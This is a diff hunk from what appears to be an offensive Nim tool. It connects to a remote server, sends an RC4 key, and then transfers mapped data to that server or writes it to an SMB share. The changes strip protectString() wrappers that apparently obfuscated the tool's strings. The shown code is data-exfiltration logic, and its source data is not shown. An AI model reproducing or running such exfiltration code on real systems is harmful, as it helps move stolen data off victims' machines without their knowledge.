@@ -284,17 +284,17 @@ when isMainModule:
         let socket = newSocket()
     
         try:
-            socket.connect(protectString(serverIP), Port(serverPort))
+            socket.connect(serverIP, Port(serverPort))
         except:
             echo "\n[-] Could Not Connect to Server!\n[!] Quitting..."
             quit(1)
     
-        echo protectString("\n[!] Sending Encryption Key to Server...")
+        echo "\n[!] Sending Encryption Key to Server..."
         if not socket.trySend(rc4KeyStr):
-            echo protectString("[-] Could Not Send Encryption Key to Server!")
+            echo "[-] Could Not Send Encryption Key to Server!"
 
         ##if not socket.trySend($size):
-        ##    echo protectString("[-] Could Not Send Size to Expect to Server!")
+        ##    echo "[-] Could Not Send Size to Expect to Server!"
     
         echo "\n[!] Sending Data to Server..."
         var bytesSent: int = 0
@@ -317,7 +317,7 @@ when isMainModule:
         var dwBytesWritten: DWORD
 
         echo "\n"
-        echo protectString(fmt"[!] Sending Data to {smbShare}")
+        echo fmt"[!] Sending Data to {smbShare}"
         var smbFile = CreateFile(smbShare, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, cast[HANDLE](NULL))
         if smbFile != INVALID_HANDLE_VALUE:
             if WriteFile(smbFile, mappedData, size, addr dwBytesWritten, NULL) == 0:
